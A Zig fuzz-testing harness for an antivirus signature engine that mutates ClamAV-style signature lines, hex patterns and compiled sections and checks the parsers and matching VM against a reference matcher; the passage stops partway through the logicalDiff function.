//! Deterministic fuzzing: `zig build fuzz -Dfuzz-iterations=N -Dfuzz-seed=S`. Same seed, same
//! cases. Each target mutates valid inputs and must never crash, hang or leak; errors are fine.
//! `-Dfuzz-target=name` runs only the targets whose function name contains `name`.
const std = @import("std");
const zav = @import("zav");
const host_fuzz = @import("fuzz_host.zig");

pub fn main(init: std.process.Init) !void {
    const args = try init.minimal.args.toSlice(init.arena.allocator());
    const iterations = if (args.len > 1) try std.fmt.parseInt(usize, args[1], 10) else 10_000;
    const seed = if (args.len > 2) try std.fmt.parseInt(u64, args[2], 10) else 0x5eed_5eed;
    const only: []const u8 = if (args.len > 3) args[3] else "";

    var prng = std.Random.DefaultPrng.init(seed);
    const random = prng.random();
    var gpa: std.heap.DebugAllocator(.{}) = .init;
    defer if (gpa.deinit() == .leak) @panic("fuzz: leak");

    var formats = try Formats.init(init.io);
    defer formats.deinit();

    var cases: usize = 0;
    for (0..iterations) |i| {
        if (selected(only, "cvdContainer")) {
            try cvdContainer(gpa.allocator(), random, if (i % 2 == 0) zav.compile.cvd.fixture_cvd else zav.compile.cvd.fixture_cld);
            cases += 1;
        }
        if (i % 8 == 0 and selected(only, "cvdSign")) {
            cvdSign(random);
            cases += 1;
        }
        if (selected(only, "hashLine")) {
            hashLine(random);
            cases += 1;
        }
        if (selected(only, "hashSections")) {
            hashSections(random);
            cases += 1;
        }
        if (selected(only, "hexBody")) {
            hexBody(random);
            cases += 1;
        }
        if (selected(only, "prefilterSection")) {
            try prefilterSection(gpa.allocator(), random, &prefilter_seed);
            cases += 1;
        }
        if (selected(only, "ndbLine")) {
            ndbLine(random);
            cases += 1;
        }
        if (selected(only, "verifyDiff")) {
            verifyDiff(random);
            cases += 1;
        }
        if (selected(only, "progSection")) {
            progSection(random);
            cases += 1;
        }
        if (selected(only, "anchoredSection")) {
            anchoredSection(random);
            cases += 1;
        }
        if (selected(only, "ldbLine")) {
            ldbLine(random);
            cases += 1;
        }
        if (selected(only, "ldbExpr")) {
            ldbExpr(random);
            cases += 1;
        }
        if (selected(only, "ldbSection")) {
            ldbSection(random);
            cases += 1;
        }
        if (selected(only, "logicalDiff")) {
            logicalDiff(random);
            cases += 1;
        }
        if (selected(only, "byteCompare")) {
            byteCompare(random);
            cases += 1;
        }
        if (selected(only, "ftmLine")) {
            ftmLine(random);
            cases += 1;
        }
        if (selected(only, "ftmClassify")) {
            ftmClassify(random);
            cases += 1;
        }
        if (selected(only, "cdbLine")) {
            cdbLine(random);
            cases += 1;
        }
        if (selected(only, "yaraRule")) {
            try yaraRule(random);
            cases += 1;
        }
        if (selected(only, "yaraCond")) {
            yaraCond(random);
            cases += 1;
        }
        if (selected(only, "lzfseDecode")) {
            lzfseDecode(random);
            cases += 1;
        }
        // Host and CVE parsers live in fuzz_host.zig; each name selects one target.
        cases += try host_fuzz.run(gpa.allocator(), random, only);
        // Format parsers and decoders (fmt/): one per iteration in rotation, or every target whose
        // name contains the filter ("fmt.zip").
        cases += formats.run(random, i, only);
    }
    std.debug.print("fuzz: {d} cases, seed {d}, ok\n", .{ cases, seed });
}

fn selected(only: []const u8, name: []const u8) bool {
    return only.len == 0 or std.mem.indexOf(u8, name, only) != null;
}

/// Mutate a valid input in place: random byte flips, inserted grammar characters, truncation.
fn mutate(random: std.Random, buf: []u8, len: usize, alphabet: []const u8) []u8 {
    var n = len;
    for (0..random.uintLessThan(usize, 6)) |_| {
        if (n == 0) break;
        const at = random.uintLessThan(usize, n);
        switch (random.uintLessThan(u8, 3)) {
            0 => buf[at] = random.int(u8),
            1 => buf[at] = alphabet[random.uintLessThan(usize, alphabet.len)],
            else => if (n < buf.len) {
                std.mem.copyBackwards(u8, buf[at + 1 .. n + 1], buf[at..n]);
                buf[at] = alphabet[random.uintLessThan(usize, alphabet.len)];
                n += 1;
            },
        }
    }
    if (random.uintLessThan(u8, 4) == 0) n = random.uintLessThan(usize, n + 1);
    return buf[0..n];
}

/// Hex bodies: parse in a fixed arena (so allocation is bounded), print, re-parse the printed
/// form and require the same text (the printer is a fixed point), then expand modifiers.
/// A PREFILTER section built once, then mutated: loading refuses or accepts it, and a scan of
/// what loads never reads out of bounds.
const PrefilterSeed = struct {
    arena: std.heap.ArenaAllocator,
    programs: zav.match.prog.Programs,
    section: []align(64) const u8,

    fn get(seed: *?PrefilterSeed, gpa: std.mem.Allocator) !*PrefilterSeed {
        if (seed.*) |*s| return s;
        const zc = zav.compile;
        var arena: std.heap.ArenaAllocator = .init(std.heap.page_allocator);
        const a = arena.allocator();
        _ = gpa;
        const hexes = [_][]const u8{ "13a7c95be2f1408d77e3b1aa", "5be2f1408d77e3", "c95be2f1", "ff25a4{3}0000000000000000", "8185??f?ffff{4}81ad", "6576616c28*756e657363617065" };
        var inputs: std.ArrayList(zc.prog_build.Input) = .empty;
        for (hexes, 0..) |hex, i| {
            var diag: zc.hexsig.Diag = .{};
            try inputs.append(a, .{ .pattern = try zc.hexsig.parse(a, hex, &diag), .sig = @intCast(i), .target = @intCast(i % 2) });
        }
        const planned = try zc.atoms.plan(a, zc.gram_model.Model.default(), .{}, inputs.items, &.{});
        var w = zc.prog_build.Writer.init(a, null);
        for (inputs.items, planned) |*in, p| {
            in.atom = p.atom(in.offset.kind);
            _ = try w.add(in.*);
        }
        const bytes = try w.finish();
        const image = try a.alignedAlloc(u8, .@"64", bytes.len);
        @memcpy(image, bytes);
        const programs = try zav.match.prog.Programs.init(image);
        const section = (try zc.prefilter_build.buildAll(a, programs, w.atoms.items, .{})).?;
        seed.* = .{ .arena = arena, .programs = programs, .section = section };
        return &seed.*.?;
    }
};

var prefilter_seed: ?PrefilterSeed = null;

fn prefilterSection(gpa: std.mem.Allocator, random: std.Random, seed_slot: *?PrefilterSeed) !void {
    const seed = try PrefilterSeed.get(seed_slot, gpa);
    const copy = try gpa.alignedAlloc(u8, .@"64", seed.section.len);
    defer gpa.free(copy);
    @memcpy(copy, seed.section);
    for (0..1 + random.uintLessThan(usize, 8)) |_| {
        const i = random.uintLessThan(usize, copy.len);
        copy[i] = switch (random.uintLessThan(u8, 3)) {
            0 => random.int(u8),
            1 => 0xff,
            else => 0,
        };
    }
    const parts = zav.match.prefilter.loadAll(copy, seed.programs) catch return;
    var data: [4096]u8 = undefined;
    random.bytes(&data);
    var ring: [zav.match.prefilter.ring_len]zav.match.prefilter.Candidate = undefined;
    const Sink = struct {
        n: usize = 0,
        count: usize,
        pub fn candidate(s: *@This(), prog_index: u32, anchor_start: usize) bool {
            if (prog_index >= s.count or anchor_start > 4096) @panic("fuzz: prefilter candidate out of range");
            s.n += 1;
            return true;
        }
    };
    for (parts) |maybe| if (maybe) |part| {
        var sink: Sink = .{ .count = seed.programs.count() };
        _ = zav.match.prefilter.scan(&part, &data, &ring, &sink, null);
    };
}

fn hexBody(random: std.Random) void {
    const hexsig = zav.compile.hexsig;
    const seeds = [_][]const u8{
        "6869*6a6b{3-4}6c6d??6e(6f|70)[2-5]71",
        "dead!(aabb|ccdd)be?f{-10}cafe{10-}babe",
        "(B)4142(43|44??|{3}45)~4?(L)46{200}47(W)48",
        "aa~bb~c?~?dd[1-32]ee",
    };
    var mem: [256 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    const arena = fba.allocator();
    var buf: [256]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const body = mutate(random, &buf, seed.len, "0123456789abcdef?*{}[]()|!~-BLW");
    var diag: hexsig.Diag = .{};
    const p = hexsig.parse(arena, body, &diag) catch {
        if (diag.pos > body.len) @panic("fuzz: hex diag out of range");
        return;
    };
    var out1: [4096]u8 = undefined;
    var w1: std.Io.Writer = .fixed(&out1);
    hexsig.format(p, &w1) catch return;
    const again = hexsig.parse(arena, w1.buffered(), &diag) catch @panic("fuzz: printed hex body does not parse");
    var out2: [4096]u8 = undefined;
    var w2: std.Io.Writer = .fixed(&out2);
    hexsig.format(again, &w2) catch @panic("fuzz: reprint failed");
    if (!std.mem.eql(u8, w1.buffered(), w2.buffered())) @panic("fuzz: hex print is not a fixed point");
    const mods: zav.compile.ir.Modifiers = @bitCast(random.int(u8) & 0x0f);
    _ = hexsig.expand(arena, p, mods) catch {};
}

/// `.ndb` lines: targets, every offset form, flevels and bodies.
fn ndbLine(random: std.Random) void {
    const ndb = zav.compile.ndb;
    const seeds = [_][]const u8{
        "Win.Trojan.A-1-0:1:EP+12,4:e8????????5d(aa|bb):60:200",
        "Doc.Mal.B-2-1:2:EOF-100:d0cf11e0*aabb{4-8}ccdd",
        "Elf.C-3-0:6:S2+16:7f454c46~00??",
        "Macho.D-4-0:9:SE1:cafebabe",
        "Html.E-5-0:3:10,5:3c736372697074",
    };
    var mem: [64 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    var buf: [256]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const line = mutate(random, &buf, seed.len, "0123456789abcdef:,+-*EPOFSLVI?{}()|");
    var column: u32 = 0;
    if (ndb.parseLine(fba.allocator(), line, &column)) |rule| {
        if (rule.target > ndb.max_target) @panic("fuzz: ndb target out of range");
        if (ndb.needsExecutable(rule.subsig.offset.kind) and !ndb.isExecutableTarget(rule.target)) @panic("fuzz: ndb executable offset on a non-executable target");
    } else |_| {
        if (column > line.len) @panic("fuzz: ndb column out of range");
    }
}

/// A random program (a mutated body, random modifiers) over random short data, run through the
/// verify VM's scanner and through an independent exhaustive matcher: whenever the VM finishes
/// within budget, both must agree on whether there is a match, and every VM match must be one
/// the exhaustive matcher accepts. The budget must never be overrun.
fn verifyDiff(random: std.Random) void {
    const zc = zav.compile;
    const prog = zav.match.prog;
    const vm = zav.match.verify_vm;
    const seeds = [_][]const u8{
        "6162*6364",
        "61{1-3}62{-2}6364",
        "61(62|6364|6?)65",
        "61!(62|63)64*65",
        "(B)6162(L)63",
        "61~62??63[1-3]64",
        "6162{3}63(W)64",
        "61*62*63*64",
        "6261{2-}6162",
    };
    var mem: [128 * 1024]u8 align(8) = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    const arena = fba.allocator();
    var buf: [128]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const body = if (random.boolean()) buf[0..seed.len] else mutate(random, &buf, seed.len, "61626364?*{}[]()|!~-123BLW");
    var diag: zc.hexsig.Diag = .{};
    const pattern = zc.hexsig.parse(arena, body, &diag) catch return;
    const mods: zc.ir.Modifiers = @bitCast(random.int(u8) & 0x0f);
    const variants = zc.hexsig.expand(arena, pattern, mods) catch return;

    var data_buf: [48]u8 = undefined;
    const data = data_buf[0..random.uintAtMost(usize, data_buf.len)];
    const alphabet = "aaabbbcccdddAB \r\n\x00-";
    for (data) |*b| b.* = if (random.uintLessThan(u8, 8) == 0) random.int(u8) else alphabet[random.uintLessThan(usize, alphabet.len)];

    const kinds = [_]zc.ir.OffsetKind{ .any, .any, .absolute, .eof_minus, .entry_point, .section_entire };
    const offset: zc.ir.Offset = .{ .kind = kinds[random.uintLessThan(usize, kinds.len)], .a = random.intRangeAtMost(i32, -2, 12), .section = 0, .shift = random.uintAtMost(u32, 6) };
    var off = offset;
    if (off.kind != .entry_point and off.a < 0) off.a = -off.a;
    const sections = [_]vm.Section{.{ .offset = random.uintAtMost(u64, 20), .size = random.uintAtMost(u64, 30) }};
    const info: vm.FileInfo = .{ .size = data.len, .entry_point = random.uintAtMost(u64, 20), .sections = &sections };

    // Half the time, plant an instance of the first variant so matches are common.
    if (random.boolean() and data.len > 0) plant(variants[0].pattern, data, random.uintLessThan(usize, data.len), random);

    for (variants) |v| {
        var flags: u8 = 0;
        if (mods.fullword) flags |= prog.flag_fullword;
        if (v.wide) flags |= prog.flag_wide;
        const input = [_]zc.prog_build.Input{.{ .pattern = v.pattern, .offset = off, .sig = 1, .flags = flags }};
        const bytes = zc.prog_build.build(arena, &input) catch return;
        const aligned = arena.alignedAlloc(u8, .@"4", bytes.len) catch return;
        @memcpy(aligned, bytes);
        const progs = prog.Programs.init(aligned) catch @panic("fuzz: compiler built a program that does not validate");
        const program = progs.get(0);

        var budget: vm.Budget = .{ .per_verify = 20_000, .per_file = 200_000 };
        var scanner = vm.Scanner.init(program, data, info, &budget);
        var vm_found = false;
        while (true) {
            const m = scanner.next() catch break;
            const hit = m orelse break;
            vm_found = true;
            if (hit.start > hit.end or hit.end > data.len) @panic("fuzz: verify match out of bounds");
            const window = vm.startWindow(program.offset(), info) orelse @panic("fuzz: match without a window");
            if (!naiveFrom(program, data, window, hit.start, flags)) @panic("fuzz: verify VM match the exhaustive matcher rejects");
        }
        if (budget.used > budget.per_file) @panic("fuzz: verify budget overrun");
        if (budget.exhausted) continue;
        const naive_found = if (vm.startWindow(program.offset(), info)) |w| blk: {
            var s: usize = @intCast(@min(w.lo, data.len));
            while (s <= @min(w.hi, data.len)) : (s += 1) if (naiveFrom(program, data, w, s, flags)) break :blk true;
            break :blk false;
        } else false;
        if (naive_found != vm_found) {
            var out: [512]u8 = undefined;
            var w: std.Io.Writer = .fixed(&out);
            zc.hexsig.format(v.pattern, &w) catch {};
            std.debug.print("body {s} -> {s} mods {} off {} info ep {any} sec {any} vm {} naive {}\ndata {any}\n", .{ body, w.buffered(), mods, off, info.entry_point, sections, vm_found, naive_found, data });
            @panic("fuzz: verify VM and the exhaustive matcher disagree");
        }
    }
}

/// Write bytes the pattern would accept into `data` from `pos` (clipped at the end).
fn plant(p: zav.compile.ir.Pattern, data: []u8, pos: usize, random: std.Random) void {
    var at = pos;
    for (p.ops) |o| {
        if (at >= data.len) return;
        switch (o.code) {
            .lit, .masked => for (p.bytes(o)) |b| {
                if (at >= data.len) return;
                data[at] = if (o.flags & zav.compile.ir.op_negate != 0) b ^ 0xff else b;
                at += 1;
            },
            .gapf => at += o.a,
            .part_end => at += o.a + if (o.b < o.a) 0 else random.uintAtMost(usize, @min(3, o.b - o.a)),
            .alt => {
                const alts = p.alternatives(o);
                for (p.altOps(alts[random.uintLessThan(usize, alts.len)])) |inner| switch (inner.code) {
                    .lit, .masked => for (p.bytes(inner)) |b| {
                        if (at >= data.len) return;
                        data[at] = b;
                        at += 1;
                    },
                    else => at += inner.a,
                };
            },
            .nalt => at += o.b & 0xffff,
            .bound => {
                data[at] = ' ';
                at += 1;
            },
            else => {},
        }
    }
}

/// The exhaustive reference: does the whole program match starting exactly at `start`?
fn naiveFrom(program: zav.match.prog.Program, data: []const u8, w: zav.match.verify_vm.Window, start: usize, flags: u8) bool {
    const prog = zav.match.prog;
    if (start < w.lo or start > w.hi) return false;
    if (flags & prog.flag_fullword != 0 and naiveWordBefore(data, start, flags)) return false;
    return naiveOps(program.pattern, program.pattern.ops, data, w, start, flags);
}

fn naiveBoundByte(class: zav.compile.ir.Bound, b: u8, where: enum { before, after, middle }, data: []const u8, at: usize) bool {
    const before = " -./<@_";
    const after = "\n\r \"'-/=>_";
    return switch (class) {
        .nonalnum => !naiveAlnum(b),
        .line => b == '\n' or (where == .after and b == '\r' and at + 1 < data.len and data[at + 1] == '\n'),
        .word => switch (where) {
            .before => std.mem.indexOfScalar(u8, before, b) != null,
            .after => std.mem.indexOfScalar(u8, after, b) != null,
            .middle => std.mem.indexOfScalar(u8, before, b) != null or std.mem.indexOfScalar(u8, after, b) != null,
        },
    };
}

fn naiveAlnum(b: u8) bool {
    return (b >= '0' and b <= '9') or (b >= 'a' and b <= 'z') or (b >= 'A' and b <= 'Z');
}

fn naiveWordBefore(data: []const u8, pos: usize, flags: u8) bool {
    if (flags & zav.match.prog.flag_wide != 0) return pos >= 2 and data[pos - 1] == 0 and naiveAlnum(data[pos - 2]);
    return pos > 0 and naiveAlnum(data[pos - 1]);
}

fn naiveWordAfter(data: []const u8, pos: usize, flags: u8) bool {
    if (flags & zav.match.prog.flag_wide != 0) return pos + 1 < data.len and data[pos + 1] == 0 and naiveAlnum(data[pos]);
    return pos < data.len and naiveAlnum(data[pos]);
}

fn naiveByte(want: u8, got: u8, fold: bool) bool {
    if (want == got) return true;
    if (!fold) return false;
    const lw = if (want >= 'A' and want <= 'Z') want + 32 else want;
    const lg = if (got >= 'A' and got <= 'Z') got + 32 else got;
    return lw == lg;
}

/// Straight-line ops (alternatives): bytes consumed at `pos`, or null.
fn naiveLine(p: zav.compile.ir.Pattern, ops: []const zav.compile.ir.Op, data: []const u8, pos: usize, fold: bool) ?usize {
    const ir = zav.compile.ir;
    var at = pos;
    for (ops) |o| switch (o.code) {
        .lit => {
            if (at + o.len > data.len) return null;
            for (p.bytes(o), 0..) |b, i| if (!naiveByte(b, data[at + i], fold or o.flags & ir.op_nocase != 0)) return null;
            at += o.len;
        },
        .masked => {
            if (at + o.len > data.len) return null;
            for (p.bytes(o), p.masks(o), 0..) |v, m, i| {
                const hit = (data[at + i] & m) == v;
                if (hit == (o.flags & ir.op_negate != 0)) return null;
            }
            at += o.len;
        },
        .gapf => {
            if (at + o.a > data.len) return null;
            at += o.a;
        },
        else => return null,
    };
    return at - pos;
}

fn naiveOps(p: zav.compile.ir.Pattern, ops: []const zav.compile.ir.Op, data: []const u8, w: zav.match.verify_vm.Window, pos: usize, flags: u8) bool {
    const ir = zav.compile.ir;
    if (ops.len == 0) {
        if (pos > w.end_limit) return false;
        return !(flags & zav.match.prog.flag_fullword != 0 and naiveWordAfter(data, pos, flags));
    }
    const o = ops[0];
    const rest = ops[1..];
    switch (o.code) {
        .lit, .masked, .gapf => {
            const n = naiveLine(p, ops[0..1], data, pos, false) orelse return false;
            return naiveOps(p, rest, data, w, pos + n, flags);
        },
        .nalt => {
            const n = o.b & 0xffff;
            if (pos + n > data.len) return false;
            for (p.alternatives(o)) |e| if (naiveLine(p, p.altOps(e), data, pos, o.flags & ir.op_nocase != 0) != null) return false;
            return naiveOps(p, rest, data, w, pos + n, flags);
        },
        .alt => {
            for (p.alternatives(o)) |e| {
                const n = naiveLine(p, p.altOps(e), data, pos, o.flags & ir.op_nocase != 0) orelse continue;
                if (naiveOps(p, rest, data, w, pos + n, flags)) return true;
            }
            return false;
        },
        .bound => {
            // libclamav's anchors: zero-width lookarounds before the first and after the last
            // byte-consuming op, one consumed byte in between.
            const class: ir.Bound = @fromBackingInt(o.flags);
            const idx = p.ops.len - ops.len;
            const at_start = for (p.ops[0..idx]) |q| {
                if (q.code != .bound) break false;
            } else true;
            const at_end = for (rest) |q| {
                if (q.code != .bound) break false;
            } else true;
            if (at_start) {
                if (pos > 0 and !naiveBoundByte(class, data[pos - 1], .before, data, pos - 1)) return false;
                return naiveOps(p, rest, data, w, pos, flags);
            }
            if (at_end) {
                if (pos < data.len and !naiveBoundByte(class, data[pos], .after, data, pos)) return false;
                return naiveOps(p, rest, data, w, pos, flags);
            }
            if (pos >= data.len or !naiveBoundByte(class, data[pos], .middle, data, pos)) return false;
            return naiveOps(p, rest, data, w, pos + 1, flags);
        },
        .part_end => {
            var q = pos +| o.a;
            const hi = if (o.b == ir.unbounded) data.len else @min(data.len, pos +| o.b);
            while (q <= hi) : (q += 1) if (naiveOps(p, rest, data, w, q, flags)) return true;
            return false;
        },
        _ => return false,
    }
}

/// SUBSIG_PROG validation must refuse corrupt sections instead of reading out of bounds.
fn progSection(random: std.Random) void {
    const zc = zav.compile;
    var mem: [64 * 1024]u8 align(8) = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    const arena = fba.allocator();
    var diag: zc.hexsig.Diag = .{};
    const bodies = [_][]const u8{ "aa(bb|cc??|{3}dd)ee*ff{-3}11(B)", "!(aabb|ccdd)eeff[1-4]00*1122~33", "deadbeef" };
    var inputs: [3]zc.prog_build.Input = undefined;
    for (bodies, &inputs, 0..) |b, *in, i| in.* = .{ .pattern = zc.hexsig.parse(arena, b, &diag) catch unreachable, .sig = @intCast(i), .target = 1, .offset = .{ .kind = .entry_point, .a = 4 } };
    const bytes = zc.prog_build.build(arena, &inputs) catch return;
    const image = arena.alignedAlloc(u8, .@"4", bytes.len) catch return;
    @memcpy(image, bytes);
    for (0..random.uintLessThan(usize, 8)) |_| image[random.uintLessThan(usize, image.len)] = random.int(u8);
    const cut = if (random.uintLessThan(u8, 4) == 0) random.uintAtMost(usize, image.len) & ~@as(usize, 3) else image.len;
    const progs = zav.match.prog.Programs.init(image[0..cut]) catch return;
    var data: [64]u8 = undefined;
    random.bytes(&data);
    for (0..progs.count()) |i| {
        var budget: zav.match.verify_vm.Budget = .{ .per_verify = 2000, .per_file = 20_000 };
        var s = zav.match.verify_vm.Scanner.init(progs.get(i), &data, .{ .size = data.len, .entry_point = 3 }, &budget);
        while (s.next() catch null) |_| {}
    }
}

/// ANCHORED_INDEX validation against its programs, then a scan with whatever validates.
fn anchoredSection(random: std.Random) void {
    const zc = zav.compile;
    const match = zav.match;
    var mem: [64 * 1024]u8 align(8) = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    const arena = fba.allocator();
    var diag: zc.hexsig.Diag = .{};
    const specs = [_]struct { []const u8, zc.ir.Offset }{
        .{ "4d5a9000", .{ .kind = .absolute, .a = 0 } },
        .{ "4d5a5000ff", .{ .kind = .absolute, .a = 0 } },
        .{ "e8??0000", .{ .kind = .entry_point, .a = 0 } },
        .{ "c3c3c3c3", .{ .kind = .entry_point, .a = 2, .shift = 3 } },
        .{ "aa*bbcc", .{ .kind = .section_start, .section = 1, .a = 1 } },
        .{ "50414420", .{ .kind = .eof_minus, .a = 4 } },
    };
    var inputs: [specs.len]zc.prog_build.Input = undefined;
    for (specs, &inputs, 0..) |sp, *in, i| in.* = .{ .pattern = zc.hexsig.parse(arena, sp[0], &diag) catch unreachable, .target = 1, .offset = sp[1], .sig = @intCast(i) };
    const bytes = zc.prog_build.build(arena, &inputs) catch return;
    const pimage = arena.alignedAlloc(u8, .@"4", bytes.len) catch return;
    @memcpy(pimage, bytes);
    const programs = match.prog.Programs.init(pimage) catch unreachable;
    const section = (zc.anchored_build.build(arena, programs, 1) catch return) orelse unreachable;
    const image = arena.alignedAlloc(u8, .@"4", section.len) catch return;
    @memcpy(image, section);
    for (0..random.uintLessThan(usize, 6)) |_| image[random.uintLessThan(usize, image.len)] = random.int(u8);
    const index = match.anchored.Index.init(image[0 .. random.uintAtMost(usize, image.len) & ~@as(usize, 3)], programs) catch return;
    var data: [96]u8 = undefined;
    random.bytes(&data);
    const sections = [_]match.verify_vm.Section{ .{ .offset = random.uintAtMost(u64, 100), .size = random.uintAtMost(u64, 100) }, .{ .offset = random.uintAtMost(u64, 100), .size = 8 } };
    const info: match.verify_vm.FileInfo = .{ .size = data.len, .entry_point = random.uintAtMost(u64, 120), .sections = &sections };
    var budget: match.verify_vm.Budget = .{ .per_verify = 1000, .per_file = 10_000 };
    const Sink = struct {
        fn take(n: *usize, hit: match.anchored.Hit) bool {
            _ = hit;
            n.* += 1;
            return true;
        }
    };
    var n: usize = 0;
    match.anchored.scan(index, programs, &data, info, &budget, &n, Sink.take) catch {};
}

/// `.ldb` lines: target description blocks, expressions and every subsig form.
fn ldbLine(random: std.Random) void {
    const ldb = zav.compile.ldb;
    const seeds = [_][]const u8{
        "Win.Trojan.L-1-0;Engine:81-255,Target:1;0&1&2;EP+0:e8??5dc3;6b65726e656c::iw;aabb{2-4}ccdd",
        "Doc.Mal.M-2-0;Target:2,FileSize:100-2000,Container:CL_TYPE_ZIP;(0|1)>2,2&2=0;aabb;ccdd;eeff",
        "Pdf.N-3-0;Target:10,Intermediates:CL_TYPE_ANY>CL_TYPE_ZIP;0&1;2f4a53;0/eval\\(/si",
        "Elf.O-4-0;Target:6,NumberOfSections:1-9,EntryPoint:0-4096;0&1;S0+4:7f454c46;0(>>4#ib2#=0x10)",
    };
    var mem: [96 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    var buf: [256]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const line = mutate(random, &buf, seed.len, "0123456789abcdef;:,&|()=<>-+*?{}/#$EPSLCL_TYPE_");
    var column: u32 = 0;
    if (ldb.parseLine(fba.allocator(), line, &column)) |rule| {
        if (rule.subsigs.len == 0 or rule.subsigs.len > zav.compile.ir.max_subsigs) @panic("fuzz: ldb subsig count");
        if (!zav.match.ldb_table.checkRpn(rule.expr, rule.subsigs.len)) @panic("fuzz: ldb parser emitted a bad expression");
    } else |_| {
        if (column > line.len) @panic("fuzz: ldb column out of range");
    }
}

/// The expression parser alone, then evaluation over random counts.
fn ldbExpr(random: std.Random) void {
    const ldb = zav.compile.ldb;
    const lt = zav.match.ldb_table;
    var mem: [64 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    var buf: [128]u8 = undefined;
    var n: usize = 0;
    const alphabet = "0123456789&|()=<>,";
    const len = random.uintAtMost(usize, buf.len);
    while (n < len) : (n += 1) buf[n] = alphabet[random.uintLessThan(usize, alphabet.len)];
    const nsub = 1 + random.uintLessThan(usize, zav.compile.ir.max_subsigs);
    const ops = ldb.parseExpression(fba.allocator(), buf[0..n], nsub, nsub) catch return;
    if (!lt.checkRpn(ops, nsub)) @panic("fuzz: parsed expression fails its own check");
    var counts: [zav.compile.ir.max_subsigs]u32 = undefined;
    for (counts[0..nsub]) |*c| c.* = if (random.boolean()) 0 else random.uintAtMost(u32, 5);
    _ = lt.evalRpn(ops, counts[0..nsub]);
}

/// LDB_TABLE validation against its programs.
fn ldbSection(random: std.Random) void {
    const zc = zav.compile;
    const match = zav.match;
    var mem: [96 * 1024]u8 align(8) = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    const arena = fba.allocator();
    var column: u32 = 0;
    const rule = zc.ldb.parseLine(arena, "L-1-0;Target:1,FileSize:10-99;(0|1)>1,2&2=0;aabb;ccdd;EP+0:eeff", &column) catch unreachable;
    var inputs: [3]zc.prog_build.Input = undefined;
    for (rule.subsigs, &inputs, 0..) |sub, *in, i| in.* = .{ .pattern = sub.hex.pattern, .offset = sub.hex.offset, .target = 1, .sig = 0, .subsig = @intCast(i), .flags = match.prog.flag_ldb };
    const pbytes = zc.prog_build.build(arena, &inputs) catch return;
    const pimage = arena.alignedAlloc(u8, .@"4", pbytes.len) catch return;
    @memcpy(pimage, pbytes);
    const programs = match.prog.Programs.init(pimage) catch unreachable;
    const entries = [_]zc.ldb_build.Entry{.{ .rule = &rule, .sig = 0, .prog_first = 0, .prog_count = 3 }};
    const bytes = zc.ldb_build.build(arena, &entries) catch return;
    const image = arena.alignedAlloc(u8, .@"8", bytes.len) catch return;
    @memcpy(image, bytes);
    _ = match.ldb_table.LdbTable.init(image, programs) catch unreachable;
    for (0..1 + random.uintLessThan(usize, 6)) |_| image[random.uintLessThan(usize, image.len)] = random.int(u8);
    const table = match.ldb_table.LdbTable.init(image[0 .. random.uintAtMost(usize, image.len) & ~@as(usize, 7)], programs) catch return;
    var counts: [zc.ir.max_subsigs]u32 = @splat(1);
    for (table.records) |rec| _ = match.ldb_table.evalRpn(table.expr(rec), counts[0..rec.nsub]);
}

var logical_fixture: ?struct { table: zav.match.ldb_table.LdbTable, state: zav.match.logical.State } = null;
var logical_mem: [2 * 1024 * 1024]u8 align(8) = undefined;

/// Random touches through the sparse logical state against a dense reference: the same
/// signatures must match, with target descriptions decided on first touch.
fn logicalDiff(random: std.Random) void {
    const zc = zav.compile;
    const lt = zav.match.ldb_table;
    const lines = [_][]const u8{
        "A;Target:0;0&1;aaaa;bbbb",
        "B;Target:1;0|1;aaaa;bbbb",
        "C;Target:0;0>2;aaaa",
        "D;Target:0,FileSize:10-20;0&1=0;aaaa;bbbb",
        "E;Target:0;(0|1|2)=2,2;aaaa;bbbb;cccc",
        "F;Target:0;((0&1)|2)>1;aaaa;bbbb;cccc",
        "G;Target:6,EntryPoint:0-100;0<3&1;aaaa;bbbb",
        "H;Target:0,NumberOfSections:1-3;0;aaaa",
    };
    if (logical_fixture == null) {
        var fba: std.heap.FixedBufferAllocator = .init(&logical_mem);
        const a = fba.allocator();
        const rules = a.alloc(zc.ir.LogicalRule, lines.len) catch unreachable;
        const entries = a.alloc(zc.ldb_build.Entry, lines.len) catch unreachable;
        for (lines, rules, entries, 0..) |line, *r, *e, i| {
            var column: u32 = 0;
            r.* = zc.ldb.parseLine(a, line, &column) catch unreachable;
            e.* = .{ .rule = r, .sig = @intCast(i), .prog_first = 0, .prog_count = 0 };
        }
        const bytes = zc.ldb_build.build(a, entries) catch unreachable;
        const image = a.alignedAlloc(u8, .@"8", bytes.len) catch unreachable;
        @memcpy(image, bytes);
        logical_fixture = .{ .table = lt.LdbTable.init(image, null) catch unreachable, .state = zav.match.logical.State.init(a) catch unreachable };
    }
    const fx = &logical_fixture.?;
    fx.state.reset();
    fx.state.all_match = true;
    const ctx: lt.FileContext = .{
        .target = random.uintAtMost(u8, 7),
        .size = random.uintAtMost(u64, 30),
        .entry_point = if (random.boolean()) random.uintAtMost(u64, 200) else null,
        .section_count = if (random.boolean()) random.uintAtMost(u64, 5) else null,
    };
    var counts: [lines.len][3]u32 = @splat(@splat(0));
    var touched: [lines.len]bool = @splat(false);
    for (0..random.uintAtMost(usize, 12)) |_| {
        const l = random.uintLessThan(u32, lines.len);
        const nsub = fx.table.records[l].nsub;
        const sub = random.uintLessThan(u16, nsub);
        fx.state.touch(fx.table, ctx, l, sub, 0) catch @panic("fuzz: logical touch failed");
        touched[l] = true;
        counts[l][sub] += 1;
    }
    var want: [lines.len]bool = @splat(false);
    for (0..lines.len) |l| {
        if (!touched[l] or !lt.tdbMatches(fx.table.tdb(l), ctx)) continue;
